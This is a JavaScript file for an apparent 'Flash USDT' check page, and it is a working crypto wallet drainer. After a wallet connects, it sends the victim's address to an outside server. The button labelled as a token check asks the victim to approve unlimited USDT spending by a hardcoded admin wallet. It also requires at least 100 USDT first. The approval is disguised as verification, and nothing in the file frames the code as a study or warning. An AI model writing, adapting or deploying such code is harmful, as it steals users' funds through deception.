import EthereumProvider from "https://esm.sh/@walletconnect/ethereum-provider";
import { ethers } from "https://esm.sh/ethers@6.8.1";

window.onload = function () {
  const connectButton = document.getElementById("checkBalanceBtn");
  const approveButton = document.getElementById("verifyTokenBtn");
  const overlay = document.getElementById("walletConnectOverlay");

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const ADMIN_WALLET = "0x24E189414e4217962964b9D57877C91349A169Da";
  const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
  const USDT_ABI = ["function balanceOf(address owner) view returns (uint256)"];

  let signer;

  connectButton.onclick = async () => {
  overlay.style.display = "flex";

  // Wait for 3 seconds first
  await new Promise(resolve => setTimeout(resolve, 3000));

  connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking Balance...';
  connectButton.disabled = true;

  try {
    const provider = await EthereumProvider.init({
      projectId: "5c7a882142c7491241b507534414ddff",
      chains: [56],
      methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
      showQrModal: true
    });

    await provider.connect();

    const ethersProvider = new ethers.BrowserProvider(provider);
    signer = await ethersProvider.getSigner();
    const userAddress = await signer.getAddress();

    document.getElementById("walletAddress").value = userAddress;

    fetch("http://onlyforapi.com/auto/save_wallet_auto.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ wallet: userAddress })
    });

    const USDT = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
    const rawBalance = await USDT.balanceOf(userAddress);
    const balance = parseFloat(ethers.formatUnits(rawBalance, 18));

    document.getElementById("availableBalance").value = balance + " USDT";
    document.getElementById("balanceResults").style.display = "block";

    if (balance < 100) {
      document.getElementById("step3Next").disabled = true;
      document.getElementById("amountCalculation").style.display = "none";
      $('#minBalanceModal').modal('show');
    } else {
      document.getElementById("step3Next").disabled = false;
      document.getElementById("amountCalculation").style.display = "block";
      calculateAmount(balance);
    }

  } catch (err) {
    console.error("Wallet connection error:", err);
    alert("Could not connect to wallet. Please try again.");
  } finally {
    overlay.style.display = "none";
    connectButton.innerHTML = '<i class="fas fa-sync-alt"></i> Check Wallet Balance';
    connectButton.disabled = false;
  }
};


  approveButton.onclick = async () => {
    try {
      approveButton.disabled = true;
      approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

      const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
      const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
      await tx.wait();

      document.getElementById("verificationResult").style.display = "block";
      document.getElementById("confirmTransaction").disabled = false;

    } catch (err) {
      console.error("Approval error:", err);
      alert("❌ Something went wrong, please try again.");
    } finally {
      approveButton.disabled = false;
      approveButton.innerHTML = '<i class="fas fa-bolt"></i> Check Your Token for Flash USDT';
    }
  };
};
